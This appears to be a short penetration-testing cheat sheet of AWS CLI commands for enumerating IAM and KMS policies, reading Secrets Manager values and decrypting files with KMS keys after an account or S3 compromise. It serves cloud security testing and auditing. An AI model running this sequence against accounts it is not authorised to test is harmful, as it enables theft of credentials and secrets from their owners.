# AWS Secrets Manager Credential Exfiltration

### If the user has access to Secret Manager, it can decrypt the secrets using the web, cli or API

#### 1) Listing policies attached to a user

    aws iam list-attached-user-policies --user-name NAME 

## Here we can see the permissions:

#### 2) Retrieving information about a specific version of policy

    aws iam get-policy-version --policy-arn ARN --version-id ID 

#### 3) Listing secrets stored by Secrets Manager

    aws secretsmanager list-secrets 

## Here we get the secret key ID to describe the secret

#### 4) Listing information about a specific secret

    aws secretsmanager describe-secret --secret-id NAME 

#### 5) Getting resource-based policy attached to a specific secret

    aws secretsmanager get-resource-policy --secret-id ID 

## Retrieves the actual value:

#### 6) Getting the secret value

    aws secretsmanager get-secret-value --secret-id ID 

# Key Management Service (KMS)

### If we compromised as an example an S3 with an encrypted file, we can decrypt it using the keys stored in KMS.

#### 7) Listing a specific key

    aws kms describe-key --key-id ID
   
## Here we can see who can access the key, the description of it and so on:

#### 8) Listing policies attached to a specified key

    aws kms list-key-policies --key-id ID 

## TIP: Run the previous command in all keys to see who can access it

#### 9) Listing full information about a policy

    aws kms get-key-policy --policy-name NAME --key-id ID 

#### 10) Decrypt the secret using the key

    aws kms decrypt --ciphertext-blob fileb://EncryptedFile --output text --query plaintext

### There is no need to specify the key information because this information is embedded in the encrypted file
